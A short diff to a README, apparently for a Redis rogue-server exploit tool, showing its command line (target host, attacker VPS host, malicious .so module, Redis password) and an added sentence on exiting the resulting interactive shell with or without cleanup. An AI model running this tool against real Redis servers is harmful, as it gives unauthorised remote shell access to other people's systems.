@@ -14,4 +14,4 @@ test passed by Redis 5.0.9.
 python3 redis-rogue-server.py --rhost <target address> [--rport <target port>] --lhost <vps address> [--lport <vps port>] [--so <.so filename>] [--rpasswd <redis auth>]
 ```
 
-Finally, you will get a interactive shell.
+Finally, you will get a interactive shell. Use `exit` to quit and clean rhost server or use `ctrl-C` to quit without clean.
